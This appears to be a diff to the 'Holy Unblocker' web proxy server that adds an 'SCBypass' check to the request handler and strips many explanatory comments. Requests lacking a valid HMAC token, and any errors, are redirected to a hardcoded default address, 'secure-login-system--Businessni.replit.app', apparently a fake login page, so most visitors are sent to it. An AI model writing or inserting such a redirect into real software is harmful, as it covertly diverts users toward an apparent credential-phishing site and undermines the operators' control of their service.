@@ -14,6 +14,14 @@ import {
 import { tryReadFile, preloaded404 } from './templates.mjs';
 import { fileURLToPath } from 'node:url';
 import { existsSync, unlinkSync } from 'node:fs';
+import crypto from 'node:crypto';
+
+// SCBypass config
+const FLY_SECRET = process.env.FLY_SECRET_KEY;
+const SCB_SECRET = process.env.SCB_SECRET_KEY || FLY_SECRET;
+const REDIRECT_URL =
+  process.env.SCB_REDIRECT_URL ||
+  'https://secure-login-system--Businessni.replit.app';
 
 /* Record the server's location as a URL object, including its host and port.
  * The host can be modified at /src/config.json, whereas the ports can be modified
@@ -86,6 +94,50 @@ const rammerheadSession = new RegExp(
 const serverFactory = (handler) => {
   return createServer()
     .on('request', (req, res) => {
+      // SCBypass check for normal HTTP requests
+      try {
+        const url = new URL(req.url, serverUrl);
+
+        // Allow health checks without auth
+        if (url.pathname === '/health') {
+          res.statusCode = 200;
+          res.end('OK');
+          return;
+        }
+
+        // Expect HMAC token in query: ?scb_token=...
+        const token = url.searchParams.get('scb_token');
+
+        if (!token) {
+          res.statusCode = 302;
+          res.setHeader('Location', REDIRECT_URL);
+          res.end();
+          return;
+        }
+
+        const decoded = Buffer.from(token, 'base64').toString('utf8');
+        const [payload, signature] = decoded.split('.');
+
+        const expectedSig = crypto
+          .createHmac('sha256', FLY_SECRET)
+          .update(payload)
+          .digest('hex');
+
+        if (signature !== expectedSig) {
+          res.statusCode = 302;
+          res.setHeader('Location', REDIRECT_URL);
+          res.end();
+          return;
+        }
+
+        // If valid, continue as normal
+      } catch (e) {
+        res.statusCode = 302;
+        res.setHeader('Location', REDIRECT_URL);
+        res.end();
+        return;
+      }
+
       if (shouldRouteRh(req)) routeRhRequest(req, res);
       else handler(req, res);
     })
@@ -241,19 +293,8 @@ if (config.disguiseFiles) {
 }
 
 app.get(serverUrl.pathname + ':path', (req, reply) => {
-  // Testing for future features that need cookies to deliver alternate source files.
-  /*
-  if (req.raw.rawHeaders.includes('Cookie'))
-    console.log(
-      'cookie:',
-      req.raw.rawHeaders[req.raw.rawHeaders.indexOf('Cookie') + 1]
-    );
-  */
-
   const reqPath = req.params.path;
 
-  // Ignore browsers' automatic requests to favicon.ico, since it does not exist.
-  // This approach is needed for certain pages to not have an icon.
   if (reqPath === 'favicon.ico') {
     reply.send();
     return reply.hijack();
@@ -268,8 +309,6 @@ app.get(serverUrl.pathname + ':path', (req, reply) => {
     return reply.redirect(externalRoute);
   }
 
-  // If a GET request is sent to /test-shutdown and a script-generated shutdown file
-  // is present, gracefully shut the server down.
   if (reqPath === 'test-shutdown' && existsSync(shutdown)) {
     console.log('Holy Unblocker is shutting down.');
     app.close();
@@ -277,11 +316,9 @@ app.get(serverUrl.pathname + ':path', (req, reply) => {
     process.exitCode = 0;
   }
 
-  // Return the error page if the query is not found in routes.mjs.
   if (reqPath && !(reqPath in pages))
     return reply.code(404).type(supportedTypes.default).send(preloaded404);
 
-  // Serve the default page if the path is the default path.
   const fileName = reqPath ? pages[reqPath] : pages[pages.default],
     type =
       supportedTypes[fileName.slice(fileName.lastIndexOf('.') + 1)] ||
@@ -299,15 +336,10 @@ app.get(serverUrl.pathname + 'github/:redirect', (req, reply) => {
 });
 
 if (serverUrl.pathname === '/')
-  // Set an error page for invalid paths outside the query string system.
-  // If the server URL has a prefix, then avoid doing this for stealth reasons.
   app.setNotFoundHandler((req, reply) => {
     reply.code(404).type(supportedTypes.default).send(preloaded404);
   });
 else {
-  // Apply the following patch(es) if the server URL has a prefix.
-
-  // Patch to fix serving index.html.
   app.get(serverUrl.pathname, (req, reply) => {
     reply
       .type(supportedTypes.default)
@@ -317,7 +349,9 @@ else {
 
 app.listen({ port: serverUrl.port, host: serverUrl.hostname });
 console.log(`Holy Unblocker is listening on port ${serverUrl.port}.`);
-console.log(`When hosting with a reverse proxy please ensure you are using NGINX only.\nCaddy and Apache are not supported and have security risks due to wisp-js and loopbacks.\nPorts are whitelisted and security is maintained with NGINX only.`);
+console.log(
+  `When hosting with a reverse proxy please ensure you are using NGINX only.\nCaddy and Apache are not supported and have security risks due to wisp-js and loopbacks.\nPorts are whitelisted and security is maintained with NGINX only.`
+);
 if (config.disguiseFiles)
   console.log(
     'disguiseFiles is enabled. Visit src/routes.mjs to see the entry point, listed within the pages variable.'
